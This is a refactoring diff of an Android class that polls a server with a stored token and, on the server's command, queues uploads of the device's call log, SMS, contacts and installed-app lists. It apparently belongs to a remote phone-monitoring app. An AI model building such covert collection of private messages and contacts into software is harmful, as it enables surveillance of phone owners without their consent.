@@ -12,7 +12,6 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
-import com.inet.android.db.OperationWithRecordInDataBase;
 import com.inet.android.info.GetInfo;
 import com.inet.android.list.TurnSendList;
 import com.inet.android.sms.SmsSentObserver;
@@ -29,11 +28,10 @@ import custom.fileobserver.SetStateImage;
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = PeriodicRequest.class.getSimpleName()
 			.toString();
-	final private String additionURL = "api/periodic";
 	SmsSentObserver smsSentObserver = null;
-	private final int type = 3;
 	boolean periodicalFlag = true;
 	private Context ctx;
+
 	public PeriodicRequest(Context ctx) {
 		super(ctx);
 		this.ctx = ctx;
@@ -71,20 +69,19 @@ public class PeriodicRequest extends DefaultRequest {
 				.getDefaultSharedPreferences(ctx);
 		try {
 			str = Caller.doMake(null, sp.getString("access_second_token", ""),
-					additionURL, true, null, ctx);
+					ConstantRequest.PERIODIC_LINK, true, null, ctx);
 		} catch (IOException e) {
 			e.printStackTrace();
 			Logging.doLog(LOG_TAG, "IOException e PeriodicRequest",
 					"IOException e PeriodicRequest");
 		}
-		if (str != null) {
+		if (str != null && str.length() > 3)
 			getRequestData(str);
-		} else {
-			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
-					"ответа от сервера нет или он некорректен");
-			// ----------record in the database ------------------
-			OperationWithRecordInDataBase.insertRecord(null, type, null, null,
-					null, ctx);
+		else {
+			ParseToError.setError(str, null, ConstantRequest.TYPE_PERIODIC_REQUEST, -1, null, null, ctx);
+			Logging.doLog(LOG_TAG, "ответа от сервера нет",
+					"ответа от сервера нет");
+
 		}
 
 	}
@@ -96,7 +93,7 @@ public class PeriodicRequest extends DefaultRequest {
 
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
-		
+
 		Editor ed = sp.edit();
 		JSONObject jsonObject;
 		try {
@@ -106,7 +103,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 
 		String str = null;
-		
+
 		try {
 			str = jsonObject.getString("code");
 		} catch (JSONException e) {
@@ -138,7 +135,7 @@ public class PeriodicRequest extends DefaultRequest {
 
 		// ----------------errors-----------------
 		if (str.equals("0")) {
-			ParseToError.setError(response);
+			ParseToError.setError(response, ctx);
 			return;
 		}
 
@@ -321,7 +318,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
-				TurnSendList.setList("1", str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST, str, null, ctx);
 			}
 		// ---------------sms list------------------------
 		try {
@@ -331,7 +328,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_sms", "0").equals(str)) {
-				TurnSendList.setList("2", str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_SMS_REQUEST, str, null, ctx);
 			}
 
 		// ---------------contacts list------------------------
@@ -344,7 +341,7 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null)
 			if (!str.equals("0")
 					&& !sp.getString("list_contact", "0").equals(str)) {
-				TurnSendList.setList("3", str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, str, null, ctx);
 			}
 		// ---------------apps list------------------------
 
@@ -355,14 +352,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
-				TurnSendList.setList("4", str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST, str, null, ctx);
 			}
-
-		if (str != null) {
-			ed.putString("error", str);
-		} else {
-			ed.putString("error", "");
-		}
 
 		ed.commit();
 	}
